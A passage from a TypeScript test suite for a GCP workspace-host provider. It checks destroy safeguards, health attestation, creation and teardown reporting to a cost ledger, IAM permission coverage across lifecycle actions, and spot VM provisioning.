    // P-318 r38: the first destroy deleted the disk but failed its census, so it is re-driven under
    // a NEW operation whose preserve step can no longer read its source disk.
    const second = await destroyPlan('operation:destroy-2');
    const preserve = second.steps.find(({ resourceKind }) => resourceKind === 'snapshot')!;
    const applyPreserve = () =>
      provider.apply(
        { planId: second.planId, operationId: second.operationId, step: preserve, knownResources: resources },
        context(),
      );
    await expect(applyPreserve()).resolves.toMatchObject({
      state: 'unchanged',
      snapshot: { target: 'gcp', providerId: snapshotName, hostId: host.hostId },
    });
    expect(client.snapshotCalls).toHaveLength(1);

    // Calibration: an absent disk is not a blanket pass — only this host's READY snapshot of it is.
    client.seedSnapshot(snapshotName, 'another-host');
    await expect(applyPreserve()).rejects.toThrow("not labeled as managed by workspace host 'host-gcp-1'");
    client.seedSnapshot(snapshotName, host.hostId, 'CREATING');
    await expect(applyPreserve()).rejects.toThrow("GCP snapshot source disk 'pc-host-gcp-1-data' is absent");
    client.seedSnapshot(snapshotName, host.hostId);
    await expect(applyPreserve()).rejects.toThrow('was not taken from it');
  });

  it('refuses to delete a managed Router while a foreign NAT remains attached', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    client.seedForeignNat('pc-host-gcp-1-router', 'foreign-nat');
    const plan = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:foreign-nat',
        idempotencyKey: 'operation:foreign-nat',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    for (const step of plan.steps) {
      if (step.resourceKind === 'router') {
        await expect(
          provider.apply(
            { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
            context(),
          ),
        ).rejects.toThrow('still contains NAT configuration(s): foreign-nat');
        break;
      }
      await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
    }
  });
});

describe('GCP workspace-host health attestation (WI-2143924)', () => {
  it('reports unknown — never degraded — when nothing produced agentOnline', async () => {
    // The whole defect in one assertion. `agentOnline` has no producer on the GCP path, so
    // reading it as `=== true` reported a RUNNING, fully-provisioned host as `degraded` and
    // made `healthy` unreachable — a caller gating on health would have hung forever.
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);

    const health = await provider.attestHealth(host, context());

    expect(health.status).toBe('unknown');
    expect(health.checks).toContainEqual({
      name: 'workspace-agent-online',
      ok: null,
      detail: 'no producer writes agentOnline on the GCP path',
    });
    expect(health.checks).toContainEqual({ name: 'compute-running', ok: true, detail: 'RUNNING' });
  });

  it('does not let observe and attestHealth disagree about the same unmeasured field', async () => {
    // Before the fix these read one unset field in OPPOSITE directions — `observe` as
    // `=== false` (so: running) and `attestHealth` as `=== true` (so: degraded) — and one
    // healthy host was simultaneously both. Neither may now claim a measurement was made.
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);

    const [observation, health] = await Promise.all([
      provider.observe(host, context()),
      provider.attestHealth(host, context()),
    ]);

    expect(observation.state).toBe('running');
    expect(health.status).not.toBe('degraded');
    expect(health.status).not.toBe('healthy');
  });

  it('reports healthy once the agent signal is genuinely measured and passing', async () => {
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);
    const vm = host.resources.find((resource) => resource.kind === 'vm')!;
    client.setAgentOnline(vm.providerId, true);

    const health = await provider.attestHealth(host, context());

    expect(health.status).toBe('healthy');
    expect(health.checks).toContainEqual({ name: 'workspace-agent-online', ok: true });
  });

  it('reports degraded — and demotes the lifecycle state — for a MEASURED offline agent', async () => {
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);
    const vm = host.resources.find((resource) => resource.kind === 'vm')!;
    client.setAgentOnline(vm.providerId, false);

    const [observation, health] = await Promise.all([
      provider.observe(host, context()),
      provider.attestHealth(host, context()),
    ]);

    expect(health.status).toBe('degraded');
    expect(observation.state).toBe('degraded');
  });
});

/**
 * WI-10001672 — the teardown-obligation ledger's PRODUCING half.
 *
 * These assert the CREATE PATH reports, which is the one thing
 * `cloud-resource-obligations.test.ts` structurally cannot: those tests call the recorder
 * directly, so they passed unchanged for the entire life of the gap in which nothing in
 * production ever called it. A guard for this defect has to drive a provision and observe that
 * reporting happened as a CONSEQUENCE — otherwise it rebuilds the blind spot it exists to close.
 */
describe('GCP workspace-host provider created-resource reporting', () => {
  it('reports every resource a provision actually creates, including the metered VM and disk', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const observed: WorkspaceHostResourceRef[] = [];
    const workspaceIds = new Set<string>();
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: (event) => {
        observed.push(event.resource);
        workspaceIds.add(event.workspaceId);
      },
    });

    const { resources } = await provision(client, provider);

    // The ledger files rows per workspace, so a resource reported without the workspace of the
    // apply that created it would be unattributable — and the sweep could not scope its search.
    expect([...workspaceIds]).toEqual(['workspace-gcp-1']);

    // The billable pair that went unregistered for 11 days in active-alcove-504205-q3.
    expect(observed.map((item) => item.kind)).toContain('vm');
    expect(observed.map((item) => item.kind)).toContain('disk');
    // Everything the provision created is reported — no creation path may quietly opt out.
    for (const created of resources) {
      expect(observed.some((item) => item.providerId === created.providerId)).toBe(true);
    }
    // A reported resource carries what the ledger needs to identify it for teardown later.
    for (const event of observed) {
      expect(event.providerId).toBeTruthy();
      expect(event.kind).toBeTruthy();
    }
  });

  it('does not report pre-existing resources it merely adopted', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const observed: WorkspaceHostResourceRef[] = [];
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: (event) => {
        observed.push(event.resource);
      },
    });
    await provision(client, provider, desired('existing'));

    // We owe teardown only for what we created. An adopted network is the owner's, and
    // registering it would have the sweep escalate someone else's infrastructure.
    expect(observed.some((item) => item.kind === 'existing-network')).toBe(false);
  });

  it('fails the step when the ledger write fails, rather than leaving a billable resource untracked', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: () => {
        throw new Error('cloud_resource_obligation_write_failed');
      },
    });

    await expect(provision(client, provider)).rejects.toThrow('cloud_resource_obligation_write_failed');
  });

  it('reports an insert target rediscovered by reconcile — a lost confirmation is still our creation', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const observed: WorkspaceHostResourceRef[] = [];
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: (event) => {
        observed.push(event.resource);
      },
    });
    const plan = await provider.plan(
      {
        action: 'provision',
        operationId: 'operation-wi10001727',
        idempotencyKey: 'operation-wi10001727',
        desired: desired(),
      },
      context(),
    );
    const resources: WorkspaceHostResourceRef[] = [];
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
      if ('resource' in result && result.resource) resources.push(result.resource);
    }

    // Positive control: without this the assertion below could pass on a dead observer.
    const beforeReconcile = observed.length;
    expect(beforeReconcile).toBeGreaterThan(0);

    const instanceStep = plan.steps.at(-1)!;
    const reconciled = await provider.reconcile(
      {
        planId: plan.planId,
        operationId: plan.operationId,
        step: instanceStep,
        knownResources: resources,
        reason: 'ambiguous-timeout',
        previousProviderRequestId: 'operation-confirmation-lost',
      },
      context(),
    );

    // WI-10001727. Reconcile finding our own insert target already present returns `unchanged`,
    // and gating the ledger on `applied` alone dropped it — measured on host
    // pc-p317-cred-20260917b (2026-09-17T09:28-09:37Z), where create-subnetwork (attempts=5) and
    // create-firewall (attempts=2) both ended `unchanged` and got no obligation row while
    // create-network and create-router ended `applied` and did. Both unrecorded resources were
    // live and metered, invisible to the teardown sweep by construction.
    expect(reconciled.state).toBe('unchanged');
    expect(observed.slice(beforeReconcile).map((item) => item.providerId)).toContain('pc-host-gcp-1-vm');
  });

  // WI-10001673. An obligation row is ADDRESSED, not named: every GCP delete step carries
  // `hostId`, and the provider asserts the target's managed-label identity against it before
  // deleting, so a row born without one can be escalated but never reclaimed. Measured
  // 2026-09-17: all 23 rows created after migration 1168 — the migration that ADDED the column —
  // still carry host_id=''. The column exists and the writer accepts it; nothing at this seam
  // SUPPLIES it, because `hostId` was modeled on the process-wide observer BINDING (constructed
  // once in dbos/bootstrap.ts, where no host is in scope) when it is a per-provision fact.
  // `report()` has it in hand the whole time via `hostIdFor(request)`.
  it('carries the host id on every creation event — a row without it is unreclaimable', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const events: Array<{ resource: WorkspaceHostResourceRef; hostId?: string }> = [];
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: (event) => {
        events.push(event);
      },
    });
    const plan = await provider.plan(
      {
        action: 'provision',
        operationId: 'operation-wi10001673-host',
        idempotencyKey: 'operation-wi10001673-host',
        desired: desired(),
      },
      context(),
    );
    const resources: WorkspaceHostResourceRef[] = [];
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
      if ('resource' in result && result.resource) resources.push(result.resource);
    }

    // Positive control: a fixture that created nothing would make the assertion below vacuous.
    expect(events.length).toBeGreaterThan(0);
    expect(events.map((event) => event.resource.providerId)).toContain('pc-host-gcp-1-vm');
    const vmEvent = events.find((event) => event.resource.kind === 'vm');
    expect(vmEvent?.resource.incarnationId).toBe(client.insertInstanceCalls[0]?.requestId);

    // Named, not counted: a bare count would not say WHICH resource is unreclaimable.
    expect(events.filter((event) => (event.hostId ?? '') === '').map((event) => event.resource.providerId)).toEqual(
      [],
    );
    expect([...new Set(events.map((event) => event.hostId))]).toEqual(['host-gcp-1']);
  });

  // WI-10001673, the NAT half — independent of hostId and not fixed by it. `delete-nat` is
  // addressed THROUGH its Cloud Router, which is why CLOUD_RESOURCE_DELETE_CONTRACT lists
  // `parentResourceId` in nat's `requires`. The apply site holds the router name
  // (`input.request.routerName`) but `resource()` carries only project + region, so the ledger
  // never sees it: rows 4/9/16/23 all have parent_resource_id=''.
  it('carries the owning router on a NAT creation event — delete-nat is addressed through it', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const events: Array<{ resource: WorkspaceHostResourceRef; parentResourceId?: string }> = [];
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: (event) => {
        events.push(event);
      },
    });
    const plan = await provider.plan(
      {
        action: 'provision',
        operationId: 'operation-wi10001673-nat',
        idempotencyKey: 'operation-wi10001673-nat',
        desired: desired(),
      },
      context(),
    );
    const resources: WorkspaceHostResourceRef[] = [];
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
      if ('resource' in result && result.resource) resources.push(result.resource);
    }

    // Positive control: if the fixture stopped creating a NAT this test would silently pass.
    const nat = events.find((event) => event.resource.providerId === 'pc-host-gcp-1-nat');
    expect(nat).toBeDefined();
    expect(nat?.parentResourceId).toBe('pc-host-gcp-1-router');

    // Negative control: a kind addressed directly must NOT acquire a parent, or the assertion
    // above would pass on a seam that stamped every event with the same router.
    const network = events.find((event) => event.resource.providerId === 'pc-host-gcp-1-net');
    expect(network).toBeDefined();
    expect(network?.parentResourceId ?? '').toBe('');
  });

  it('still does not report an adopted resource rediscovered by reconcile', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const observed: WorkspaceHostResourceRef[] = [];
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceCreated: (event) => {
        observed.push(event.resource);
      },
    });
    client.seedExistingNetwork();
    const plan = await provider.plan(
      {
        action: 'provision',
        operationId: 'operation-adopted-reconcile',
        idempotencyKey: 'operation-adopted-reconcile',
        desired: desired('existing'),
      },
      context(),
    );
    const resources: WorkspaceHostResourceRef[] = [];
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
      if ('resource' in result && result.resource) resources.push(result.resource);
    }
    const adoptedStep = plan.steps.find((step) =>
      String((step as { input?: { op?: unknown } }).input?.op ?? '').startsWith('use-existing-'),
    );
    // Positive control: a fixture that adopted nothing would make the assertion below vacuous.
    expect(adoptedStep).toBeDefined();

    const beforeReconcile = observed.length;
    const reconciled = await provider.reconcile(
      {
        planId: plan.planId,
        operationId: plan.operationId,
        step: adoptedStep!,
        knownResources: resources,
        reason: 'ambiguous-timeout',
      },
      context(),
    );

    // The blast-radius guard for the branch above: `unchanged` still means "not ours" for a
    // use-existing-* op. Registering the owner's own network would have the sweep escalate —
    // and eventually reclaim — someone else's infrastructure.
    expect(reconciled.state).toBe('unchanged');
    expect(observed.slice(beforeReconcile)).toEqual([]);
  });

  it('closes the obligation for a delete confirmed only by the reconciling read', async () => {
    const client = new FakeGcpWorkspaceHostApiClient();
    const destroyedResources: { deleteOp: string; providerId: string }[] = [];
    const provider = createGcpWorkspaceHostProvider({
      client,
      now: () => NOW,
      onResourceDestroyed: (event) => {
        destroyedResources.push(event.resource);
      },
    });
    const { host, resources } = await provision(client, provider);
    const destroy = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation-reconcile-destroy',
        idempotencyKey: 'operation-reconcile-destroy',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    const deleteStep = destroy.steps[0]!;
    await provider.apply(
      { planId: destroy.planId, operationId: destroy.operationId, step: deleteStep, knownResources: resources },
      context(),
    );

    // Positive control: a dead observer would make the assertion below vacuous.
    const beforeReconcile = destroyedResources.length;
    expect(beforeReconcile).toBeGreaterThan(0);

    // The resource is already gone, so reconcile resolves the step by a fresh absence read
    // rather than falling through to apply.
    const reconciled = await provider.reconcile(
      {
        planId: destroy.planId,
        operationId: destroy.operationId,
        step: deleteStep,
        knownResources: resources,
        reason: 'ambiguous-timeout',
      },
      context(),
    );

    // The teardown-side twin of the creation hole: before the shared reporting seam, a delete
    // whose confirmation arrived only on the reconciling read returned `destroyed` directly and
    // never closed its obligation, leaving the row teardown_owed forever for a resource that was
    // already gone. Re-closing is safe — the ledger write is idempotent.
    expect(reconciled.state).toBe('destroyed');
    expect(destroyedResources.slice(beforeReconcile)).toHaveLength(1);
  });
});

describe('every role that creates a host holds what GCP checks on the instance insert', () => {
  async function instanceInsert(spec: WorkspaceHostDesiredSpec): Promise<GcpInstanceInsertInput> {
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'iam-pin', idempotencyKey: 'iam-pin', desired: spec },
      context(),
    );
    return (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
  }

  /** Project-level permissions the request needs that `granted` lacks. actAs is checked on the account. */
  function missing(request: GcpInstanceInsertInput, granted: Iterable<string>): string[] {
    const held = new Set(granted);
    return gcpInstanceInsertPermissions(request).filter((p) => !p.startsWith('iam.') && !held.has(p));
  }

  it('derives the permission for every field the request sets', async () => {
    const direct = desired();
    direct.provider = { ...direct.provider, transportPreference: 'gcp-direct-ssh', directSshSourceRanges: ['203.0.113.0/24'] };
    expect(gcpInstanceInsertPermissions(await instanceInsert(direct))).toEqual([
      'compute.disks.create',
      'compute.disks.use',
      'compute.images.useReadOnly',
      'compute.instances.create',
      'compute.instances.setLabels',
      'compute.instances.setMetadata',
      'compute.instances.setServiceAccount',
      'compute.instances.setTags',
      'compute.subnetworks.use',
      'compute.subnetworks.useExternalIp',
      'iam.serviceAccounts.actAs',
    ]);
  });

  it('BYOC: the preflight list covers the insert on every transport', async () => {
    for (const transportPreference of GCP_WORKSPACE_HOST_TRANSPORTS) {
      const spec = desired();
      spec.provider = {
        ...spec.provider,
        transportPreference,
        ...(transportPreference === 'gcp-direct-ssh' ? { directSshSourceRanges: ['203.0.113.0/24'] } : {}),
      };
      expect(missing(await instanceInsert(spec), GCP_WORKSPACE_HOST_REQUIRED_PERMISSIONS), transportPreference).toEqual(
        [],
      );
    }
  });

  it("Papercusp-hosted: the host and observer roles cover the real first-workspace spec, which holds no identity", async () => {
    const spec = gcpFirstWorkspaceDesiredSpec({
      hostId: 'host-gcp-1',
      record: {
        credentialRef: 'delegation://workspace-gcp-1/conn-1',
        configuration: {
          provider: 'gcp',
          source: {
            method: 'papercusp-hosted',
            projectId: 'papercusp-dev-123',
            serviceAccountEmail: 'pco-aaaa@papercusp-org-identity.iam.gserviceaccount.com',
            hostId: 'host-gcp-1',
          },
        },
      } as never,
    });
    const request = await instanceInsert(spec);
    const granted = [...PAPERCUSP_HOSTED_HOST_PERMISSIONS, ...PAPERCUSP_HOSTED_OBSERVER_PERMISSIONS];
    expect(missing(request, granted)).toEqual([]);
    expect(gcpInstanceInsertPermissions(request)).not.toContain('iam.serviceAccounts.actAs');
    // Control: the list as it stood when every hosted create was refused 403 is caught.
    expect(missing(request, granted.filter((p) => p !== 'compute.instances.setTags'))).toEqual([
      'compute.instances.setTags',
    ]);
  });

  it('spot (WI-10005210): a spot insert needs setScheduling, and every create role holds it', async () => {
    const spec = gcpFirstWorkspaceDesiredSpec({
      hostId: 'host-gcp-1',
      record: {
        credentialRef: 'delegation://workspace-gcp-1/conn-1',
        configuration: {
          provider: 'gcp',
          source: {
            method: 'papercusp-hosted',
            projectId: 'papercusp-dev-123',
            serviceAccountEmail: 'pco-aaaa@papercusp-org-identity.iam.gserviceaccount.com',
            hostId: 'host-gcp-1',
          },
        },
      } as never,
    });
    spec.provider = { ...spec.provider, provisioningModel: 'spot' };
    const request = await instanceInsert(spec);
    expect(gcpInstanceInsertPermissions(request)).toContain('compute.instances.setScheduling');
    const hosted = [...PAPERCUSP_HOSTED_HOST_PERMISSIONS, ...PAPERCUSP_HOSTED_OBSERVER_PERMISSIONS];
    expect(missing(request, hosted)).toEqual([]);
    expect(missing(request, GCP_WORKSPACE_HOST_REQUIRED_PERMISSIONS)).toEqual([]);
    expect(missing(request, hosted.filter((p) => p !== 'compute.instances.setScheduling'))).toEqual([
      'compute.instances.setScheduling',
    ]);
  });
});

describe('every role that drives the GCP provider holds what GCP checks on each call it makes (WI-10005297)', () => {
  type CallPermissions = Record<string, (...args: unknown[]) => readonly string[]>;
  const table = GCP_WORKSPACE_HOST_CALL_PERMISSIONS as unknown as CallPermissions;

  /** Wraps the fake so every client call records the permissions GCP would check for it. */
  function recordingProvider() {
    const client = new FakeGcpWorkspaceHostApiClient();
    const needed = new Map<string, Set<string>>();
    const called = new Set<string>();
    const recorded = new Proxy(client, {
      get(target, prop, receiver) {
        const value = Reflect.get(target, prop, receiver) as unknown;
        if (typeof prop !== 'string' || typeof value !== 'function' || !(prop in table)) return value;
        return (...args: unknown[]) => {
          called.add(prop);
          for (const permission of table[prop]!(...args)) {
            if (!needed.has(permission)) needed.set(permission, new Set());
            needed.get(permission)!.add(prop);
          }
          return (value as (...a: unknown[]) => unknown).apply(target, args);
        };
      },
    });
    const provider = createGcpWorkspaceHostProvider({ client: recorded, now: () => NOW });
    return { client, provider, needed, called };
  }

  async function applyAll(
    provider: ReturnType<typeof createGcpWorkspaceHostProvider>,
    plan: Awaited<ReturnType<ReturnType<typeof createGcpWorkspaceHostProvider>['plan']>>,
    resources: WorkspaceHostResourceRef[],
  ): Promise<void> {
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: [...resources] },
        context(),
      );
      expect(['applied', 'destroyed', 'unchanged'], `${plan.operationId}/${step.id}`).toContain(result.state);
      if ('resource' in result && result.resource) resources.push(result.resource);
    }
  }

  /** Provision, every lifecycle action, a restore into a second host, then destroy both. */
  async function driveEveryLifecycle(spec: WorkspaceHostDesiredSpec) {
    const recording = recordingProvider();
    const { client, provider } = recording;
    const { host, resources } = await provision(client, provider, spec);
    for (const action of ['stop', 'start', 'restart', 'snapshot', 'repair'] as const) {
      const plan = await provider.plan(
        action === 'snapshot'
          ? { action, operationId: `op:${action}`, idempotencyKey: `op:${action}`, host, name: 'manual-snapshot' }
          : { action, operationId: `op:${action}`, idempotencyKey: `op:${action}`, host },
        context({}, '#!/usr/bin/env bash\necho bootstrap\n'),
      );
      await applyAll(provider, plan, resources);
    }

    client.seedSnapshot(`pc-${spec.hostId}-q3`, spec.hostId);
    // The second host derives its own resource names; pinned names would collide with the first.
    const { instanceName: _instance, dataDiskName: _disk, ...derivedNames } = (spec.provider ?? {}) as Record<
      string,
      unknown
    >;
    const recovered = {
      ...spec,
      hostId: `${spec.hostId}-recovered`,
      provider: { ...derivedNames, network: { mode: 'managed' } },
    } as WorkspaceHostDesiredSpec;
    const restore = await provider.plan(
      {
        action: 'restore',
        operationId: 'op:restore',
        idempotencyKey: 'op:restore',
        host,
        snapshot: {
          target: 'gcp',
          providerId: `projects/${spec.scope.id}/global/snapshots/pc-${spec.hostId}-q3`,
          hostId: spec.hostId,
        },
        desired: recovered,
      },
      context(),
    );
    const restoredResources: WorkspaceHostResourceRef[] = [];
    await applyAll(provider, restore, restoredResources);

    for (const [target, targetResources] of [
      [host, resources],
      [{ hostId: recovered.hostId, target: 'gcp', resources: restoredResources } as WorkspaceHostRef, restoredResources],
    ] as const) {
      const destroy = await provider.plan(
        {
          action: 'destroy',
          operationId: `op:destroy:${target.hostId}`,
          idempotencyKey: `op:destroy:${target.hostId}`,
          host: target,
          disposition: 'discard',
          confirmation: { expectedHostId: target.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
        },
        context(),
      );
      await applyAll(provider, destroy, [...targetResources]);
    }
    return recording;
  }

  /** What the run needed that `granted` lacks, with the calls that needed it. actAs is checked on the account. */
  function uncovered(needed: Map<string, Set<string>>, granted: Iterable<string>): Record<string, string[]> {
    const held = new Set(granted);
    return Object.fromEntries(
      [...needed]
        .filter(([permission]) => !permission.startsWith('iam.') && !held.has(permission))
        .sort(([a], [b]) => a.localeCompare(b))
        .map(([permission, calls]) => [permission, [...calls].sort()] as const),
    );
  }

  const customerProjectSpec = () =>
    gcpFirstWorkspaceDesiredSpec({
      hostId: 'host-gcp-1',
      record: {
        credentialRef: 'delegation://workspace-gcp-1/conn-1',
        configuration: {
          provider: 'gcp',
          source: {
            method: 'service-account-impersonation',
            projectId: 'papercusp-dev-123',
            serviceAccountEmail: 'papercusp-host-operator@papercusp-dev-123.iam.gserviceaccount.com',
          },
        },
      } as never,
    });

  it('the run is not vacuous: it reaches every mutating call the provider can make', async () => {
    const { called } = await driveEveryLifecycle(customerProjectSpec());
    const mutating = Object.keys(table).filter((method) => /^(insert|delete|create|start|stop|reset|set)/.test(method));
    expect(mutating.filter((method) => !called.has(method))).toEqual([]);
    expect(called).toContain('waitForOperation');
  });

  it('BYOC (customer project, hosted and desktop): the required list covers every call of every lifecycle', async () => {
    for (const spec of [customerProjectSpec(), desired()]) {
      const { needed } = await driveEveryLifecycle(spec);
      expect(uncovered(needed, GCP_WORKSPACE_HOST_REQUIRED_PERMISSIONS)).toEqual({});
    }
  });

  it('BYOC hosted: the customer-project VM holds no identity, so no lifecycle call needs actAs (WI-10005297)', async () => {
    // `uncovered` exempts iam.* (actAs is granted on the account, not the project), which is how a
    // spec attaching the controller identity to the VM passed the coverage test above and was then
    // refused live with SERVICE_ACCOUNT_ACCESS_DENIED. Nothing grants that, so nothing may need it.
    const identityPermissions = (needed: Map<string, Set<string>>) =>
      [...needed.keys()]
        .filter((permission) => permission.startsWith('iam.') || permission === 'compute.instances.setServiceAccount')
        .sort();
    expect(identityPermissions((await driveEveryLifecycle(customerProjectSpec())).needed)).toEqual([]);

    // Control: the pre-fix spec (controller identity on the VM) is what this check exists to catch.
    const spec = customerProjectSpec() as WorkspaceHostDesiredSpec & { provider: Record<string, unknown> };
    const attached = {
      ...spec,
      provider: { ...spec.provider, serviceAccountEmail: 'papercusp-host-operator@papercusp-dev-123.iam.gserviceaccount.com' },
    } as WorkspaceHostDesiredSpec;
    expect(identityPermissions((await driveEveryLifecycle(attached)).needed)).toEqual([
      'compute.instances.setServiceAccount',
      'iam.serviceAccounts.actAs',
    ]);
  });

  it('BYOC: calls whose permissions do not depend on their arguments are covered too', () => {
    // driveEveryLifecycle reaches the argument-dependent calls; this reaches the read/catalog ones
    // (inventory, regions, sizes, images) a lifecycle never makes.
    const argumentFree = Object.entries(table).filter(([, permissionsFor]) => permissionsFor.length === 0);
    expect(argumentFree.length).toBeGreaterThan(20);
    const needed = new Map<string, Set<string>>();
    for (const [method, permissionsFor] of argumentFree) {
      for (const permission of permissionsFor()) needed.set(permission, new Set([method]));
    }
    expect(uncovered(needed, GCP_WORKSPACE_HOST_REQUIRED_PERMISSIONS)).toEqual({});
  });

  it('control: the list as it stood at the first live BYOC provision is caught at create-subnetwork', async () => {
    const { needed } = await driveEveryLifecycle(customerProjectSpec());
    const before = GCP_WORKSPACE_HOST_REQUIRED_PERMISSIONS.filter(
      (permission) =>
        ![
          'compute.networks.updatePolicy',
          'compute.instances.reset',
          'compute.snapshots.create',
          'compute.snapshots.setLabels',
          'compute.snapshots.useReadOnly',
        ].includes(permission),
    );
    expect(uncovered(needed, before)).toMatchObject({
      'compute.networks.updatePolicy': expect.arrayContaining(['insertSubnetwork', 'insertFirewall', 'insertRouter']),
      'compute.instances.reset': ['resetInstance'],
      'compute.snapshots.create': ['createSnapshot'],
    });
  });

  it('Papercusp-hosted: the host and observer roles cover every call of every lifecycle', async () => {
    const spec = gcpFirstWorkspaceDesiredSpec({
      hostId: 'host-gcp-1',
      record: {
        credentialRef: 'delegation://workspace-gcp-1/conn-1',
        configuration: {
          provider: 'gcp',
          source: {
            method: 'papercusp-hosted',
            projectId: 'papercusp-dev-123',
            serviceAccountEmail: 'pco-aaaa@papercusp-org-identity.iam.gserviceaccount.com',
            hostId: 'host-gcp-1',
          },
        },
      } as never,
    });
    const { needed } = await driveEveryLifecycle(spec);
    expect(uncovered(needed, [...PAPERCUSP_HOSTED_HOST_PERMISSIONS, ...PAPERCUSP_HOSTED_OBSERVER_PERMISSIONS])).toEqual(
      {},
    );
  });
});

describe('spot provisioning option (WI-10005210)', () => {
  async function plan(spec: WorkspaceHostDesiredSpec) {
    const { provider } = providerAndClient();
    return provider.plan({ action: 'provision', operationId: 'spot', idempotencyKey: 'spot', desired: spec }, context());
  }
  async function insertFor(spec: WorkspaceHostDesiredSpec): Promise<GcpInstanceInsertInput> {
    const steps = (await plan(spec)).steps;
    return (steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput })
      .request;
  }

  it('defaults to on-demand: no scheduling block and no setScheduling permission', async () => {
    const request = await insertFor(desired());
    expect(request).not.toHaveProperty('scheduling');
    expect(gcpInstanceInsertPermissions(request)).not.toContain('compute.instances.setScheduling');
    const standard = desired();
    standard.provider = { ...standard.provider, provisioningModel: 'standard' };
    expect(await insertFor(standard)).not.toHaveProperty('scheduling');
  });

  it("provisioningModel 'spot' creates a spot VM that STOPS on reclaim, so its disks and state survive", async () => {
    const spec = desired();
    spec.provider = { ...spec.provider, provisioningModel: 'spot' };
    const request = await insertFor(spec);
    expect(request.scheduling).toEqual({
      provisioningModel: 'SPOT',
      instanceTerminationAction: 'STOP',
      automaticRestart: false,
      onHostMaintenance: 'TERMINATE',
    });
    // The data disk stays a separate, retained disk.
    expect(request.disks[1]).toMatchObject({ boot: false, autoDelete: false });
  });

  it('refuses an unknown provisioningModel instead of silently creating an on-demand host', async () => {
    const spec = desired();
    spec.provider = { ...spec.provider, provisioningModel: 'preemptible' };
    await expect(plan(spec)).rejects.toThrow(/provisioningModel must be one of standard, spot/);
  });
});
